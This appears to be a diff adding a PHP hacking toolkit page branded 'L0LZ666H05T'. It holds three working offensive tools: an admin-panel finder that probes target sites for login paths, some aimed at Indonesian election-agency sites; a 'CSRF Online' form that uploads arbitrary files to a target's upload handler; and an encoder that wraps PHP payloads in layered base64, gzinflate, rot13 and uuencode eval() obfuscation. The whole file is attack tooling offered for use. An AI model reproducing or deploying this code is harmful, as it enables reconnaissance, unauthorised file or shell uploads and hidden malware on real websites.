@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <title>Hello Word</title>
+</head>
+<style type="text/css">
+    body {
+        background:#000;
+        color:#fff;
+    } table, tr, td {
+        border:1px solid #fff;
+        border-radius:5px;
+    } span.found {
+        color:lime;
+    } span.not_found {
+        color:red;
+    } table.none {
+        border:none;
+    } th.header {
+        background:green;
+        border-radius:5px;
+    }
+</style>
+<body>
+<nav class="navbar navbar-expand-lg navbar-light bg-light">
+  <a class="navbar-brand" href="http://facebook.com/599.phtm" target="_blank">L0LZ666H05T</a>
+  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+    <span class="navbar-toggler-icon"></span>
+  </button>
+
+  <div class="collapse navbar-collapse" id="navbarSupportedContent">
+    <ul class="navbar-nav mr-auto">
+      <li class="nav-item active">
+        <a class="nav-link" href="?">Home <span class="sr-only">(current)</span></a>
+      </li>
+      <li class="nav-item dropdown">
+        <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+          Tools
+        </a>
+        <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+          <a class="dropdown-item" href="?adfin">Admin Page Finder</a>
+          <a class="dropdown-item" href="?csrf">CSRF Online</a>
+          <a class="dropdown-item" href="?encode">Encode & Decode</a>
+      </li>
+    </ul>
+    <form class="form-inline my-2 my-lg-0">
+      <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">
+      <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
+    </form>
+  </div>
+</nav>
+<br><p>
+<?php
+if (isset($_GET['adfin'])) {
+    @tools("adfin");
+} elseif (isset($_GET['csrf'])) {
+    @tools("csrf");
+} elseif (isset($_GET['encode'])) {
+    @tools("encode");
+}
+function tools($toolsname = null) {
+    if ($toolsname === "adfin") {
+        ?>
+        <table align="center" width="50%" class="none">
+    <tr style="border:none">
+        <th colspan="2" class="header" style="border:none">
+            <center><h4>Admin Page Finder</h4></center>
+        </th>
+    </tr>
+    <form method="post" action="<?php $PHP_SELF ?>">
+    <tr style="border:none">
+        <td colspan="2" style="border:none">
+            <input class="form-control" type="text" name="url" placeholder="http://www.site.com">
+        </td>
+    </tr>
+    <tr style="border:none">
+        <td colspan="2" style="border:none"> 
+            <input style="width:100%" class="btn btn-success" type="submit" name="submit" value="FIND">
+        </td>
+    </tr>
+    <tr style="border:none"><th style="border:none"></th></tr>
+</form>
+<?php
+function xss_protect($data, $strip_tags = false, $allowed_tags = "") { 
+    if($strip_tags) {
+  $data = strip_tags($data, $allowed_tags . "<b>");
+    }
+
+    if(stripos($data, "script") !== false) { 
+  $result = str_replace("script","scr<b></b>ipt", htmlentities($data, ENT_QUOTES)); 
+    } else { 
+  $result = htmlentities($data, ENT_QUOTES); 
+    } 
+
+    return $result;
+}
+function urlExist($url){
+    $handle   = curl_init($url);
+    if (false === $handle)
+    {
+    return false;
+    }
+    curl_setopt($handle, CURLOPT_HEADER, false);
+    curl_setopt($handle, CURLOPT_FAILONERROR, true);
+    curl_setopt($handle, CURLOPT_HTTPHEADER, Array("User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15") ); // request as if Firefox
+    curl_setopt($handle, CURLOPT_NOBODY, true);
+    curl_setopt($handle, CURLOPT_RETURNTRANSFER, false);
+    $connectable = curl_exec($handle);
+    curl_close($handle);
+    return $connectable;
+}
+    if(isset($_POST['submit']) && isset($_POST['url']))
+    {
+  $url= htmlentities(xss_protect($_POST['url']));
+  if(filter_var($url, FILTER_VALIDATE_URL))
+  {
+$trying = array('admin/',
+        'administrator/index.php',
+        'admin1/index.php',
+        'admin2/index.php',
+        'kpu-kun194n/login.php',
+        'kpu-kun194n/index.php',
+        'kpu-Kun194n/login.php',
+        'Kpu-kun194n/login.php',
+        'b4w45lu-kun1n94n/login.php',
+        'b4w45lu-kun1n94n/index.php',
+        'bawaslu-kun1n94n/login.php',
+        '4dm1n-b4w45lu/index.php',
+        'admin_bawaslu/index.php',
+        'admin_bawaslu/login.php',
+        'admin_panel/index.php',
+        'bawaslu-kun1n94n/login.php',
+        'adminweb/login.php',
+        'admin3/index.php/',
+        'admin4/index.php',
+        'admin5/index.php',
+        'usuarios/index.php',
+        'usuario/index.php',
+        'administrator/index.php',
+        'moderator/index.php',
+        'webadmin/index.php',
+        'adminarea/index.php',
+        'cms/index.php',
+        'adminarea/index.php',
+        'kantor/admin_login.php',
+        'kantor/admin_login.php',
+        'adminweb/login.php',
+        'bb-admin/index.php',
+        'zoom-admin/index.php',
+        'admin-portal/index.php',
+        'CmsPanel/index.php',
+        'cmspanel/index.php',
+        'indexadmin/index.php',
+        'administratorbawaslu/index.php',
+        'adminLogin/index.php',
+        'admin_area/',
+        'panel-administracion/',
+        'instadmin/',
+        'memberadmin/',
+        'administratorlogin/',
+        'adm/',
+        'admin/account.php',
+        'admin/index.php',
+        'admin/login.php',
+        'admin/admin.php',
+        'admin/account.php',
+        'admin_area/admin.php',
+        'admin_area/login.php',
+        'siteadmin/login.php',
+        'siteadmin/index.php',
+        'siteadmin/login.html',
+        'admin/account.html',
+        'admin/index.html',
+        'admin/login.html',
+        'admin/admin.html',
+        'admin_area/index.php',
+        'bb-admin/index.php',
+        'bb-admin/login.php',
+        'bb-admin/admin.php',
+        'admin/home.php',
+        'admin_area/login.html',
+        'admin_area/index.html',
+        'admin/controlpanel.php',
+        'admin.php',
+        'admincp/index.asp',
+        'admincp/login.asp'
+       ,'admincp/index.html'
+       ,'admin/account.html'
+       ,'adminpanel.html','webadmin.html',
+       'webadmin/index.html');
+    foreach($trying as $sec)
+    {
+    $urll=$url.'/'.$sec;
+    if(urlExist($urll)) {
+        ?>
+        <tr>
+           <td>
+               <a href="<?php print $urll ?>" target="_blank"><?php print $urll ?></a>
+           </td>
+           <td>
+               <center><span class="found">FOUND</span></center>
+           </td> 
+        </tr>
+        <?php
+    exit;
+    }
+    else {
+    ?>
+    <tr>
+        <td>
+            <?php print $urll ?>
+        </td>
+        <td>
+            <center>
+                <center><span class="not_found">NOT FOUND</span></center>
+            </center>
+        </td>
+    </tr>
+    <?php
+    }   
+    }
+    echo '<p align="center"><font color="c0c0c0" size="5">Could not find admin page.</font></p>';
+  }
+  else
+  {
+    echo '<p align="center"><font color="c0c0c0" size="5">Invalid URL entered.</font></p>';    
+  }
+    }
+?>
+</table>
+<?php
+    }
+    if ($toolsname === "csrf") {
+        ?>
+        <table align="center" width="50%">
+            <tr>
+                <th colspan="3" style="background:green;"><center><h4>CSRF Online</h4></center></th>
+            </tr>
+        <form method="post">
+            <tr>
+                <td>
+                    URL
+                </td>
+                <td><center>:</center></td>
+                <td>
+                    <input class="form-control" type="text" name="url" placeholder="http://www.target.com/[path]/upload.php">
+                </td>
+            </tr>
+            <tr>
+                <td>
+                    POST File
+                </td>
+                <td><center>:</center></td>
+                <td>
+                    <input class="form-control" type="text" name="pf" placeholder="Filedata / files[] / qqfile / userfile / dll">
+                </td>
+            </tr>
+            <tr>
+                <td colspan="2"></td>
+                <td>
+                    <input style="width:100%" class="btn btn-success" type="submit" name="d" value="Lock Target Target!!!">
+                </td>
+            </tr>
+       </form>
+<?php
+error_reporting(0);
+$url = $_POST['url'];
+$pf = $_POST['pf'];
+$d = $_POST['d'];
+if($d) {
+    ?>
+    <form method="post" target="_blank" action="<?php print $url ?>" enctype='multipart/form-data'>
+        <tr>
+            <td colspan="2">
+                <input type="file" name="<?php print $pf ?>">
+            </td>
+            <td>
+                <input style="width:100%" class="btn btn-success" type="submit" name="g">
+            </td>
+        </tr>
+    </form>
+</table>
+    <?php
+}
+}
+if ($toolsname === "encode") {
+    ?>
+    <table align="center" width="50%">
+        <tr>
+            <th style="background:green;" colspan="3"><center><h4>Encode & Decode</h4></center></th>
+        </tr>
+       <form method="post">
+        <tr>
+            <td colspan="3">
+                <textarea style="height:200px;" class="form-control" name="code"></textarea>
+            </td>
+        </tr>
+        <tr>
+            <td>
+        <select class="form-control" name="ope">
+        <option value="urlencode">url</option>
+        <option value="base64">Base64</option>
+        <option value="ur">base64 - convert_uu</option>
+        <option value="gzinflates">gzinflate - base64</option>
+        <option value="str2">str_rot13 - base64</option>
+        <option value="gzinflate">str_rot13 - gzinflate - base64</option>
+        <option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
+        <option value="url">base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
+        </select>
+            </td>
+            <td>
+                <input class="btn btn-success" type='submit' name='submit' value='Encode'>
+            </td>
+            <td>
+                <input class="btn btn-success" type='submit' name='submits' value='Decode'>
+            </td>
+        </tr>
+</form>
+<?php 
+@ini_set('output_buffering',0); 
+@ini_set('display_errors', 0);
+$text = $_POST['code'];
+$submit = $_POST['submit'];
+if (isset($submit)){
+$op = $_POST["ope"];
+switch ($op) {
+case 'base64': $codi=base64_encode($text);
+$codi="<?php eval('?>'.base64_decode('$codi'));";
+break;
+case 'str' : $codi=base64_encode(str_rot13(gzdeflate(str_rot13($text))));
+$codi="<?php
+eval('?>'.str_rot13(gzinflate(str_rot13(base64_decode('$codi')))));";
+break;
+case 'gzinflate' : $codi=base64_encode(gzdeflate(str_rot13($text)));
+$codi="<?php
+eval('?>'.str_rot13(gzinflate(base64_decode('$codi'))));";
+break;
+case 'gzinflates' : $codi=base64_encode(gzdeflate($text));
+$codi="<?php
+eval('?>'.gzinflate(base64_decode('$codi')));";
+break;
+case 'str2' : $codi=base64_encode(str_rot13($text));
+$codi="<?php
+eval('?>'.str_rot13(base64_decode('$codi')));";
+break;
+case 'urlencode' : $codi=rawurlencode($text);
+$codi="<?php eval('?>'.rawurldecode('$codi'));";
+break;
+case 'ur' : $codi=base64_encode(convert_uuencode($text));
+$codi="<?php
+eval('?>'.convert_uudecode(base64_decode('$codi')));";
+break;
+case 'url' :
+$codi=base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
+$codi="<?php
+eval('?>'.base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode('$codi')))))));";
+break;
+default:break;
+}
+}
+$submit = $_POST['submits'];
+if (isset($submit)){
+$op = $_POST["ope"];
+switch ($op) {case 'base64': $codi=base64_decode($text);
+break;case 'str' :
+$codi=str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
+break;case 'gzinflate' : $codi=str_rot13(gzinflate(base64_decode($text)));
+break;case 'gzinflates' : $codi=gzinflate(base64_decode($text));
+break;case 'str2' : $codi=str_rot13(base64_decode($text));
+break;case 'urlencode' : $codi=rawurldecode($text);
+break;case 'ur' : $codi=base64_encode(convert_uudecode($text));
+break;case 'url' :
+$codi=base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
+break;default:break;}}
+?>
+<tr>
+    <td colspan="3">
+        <textarea class="form-control" style="height:200px;" readonly><?php print $codi ?></textarea>
+    </td>
+</tr>
+</table>
+<?php
+}
+}
+?>
+</body>
+</html>
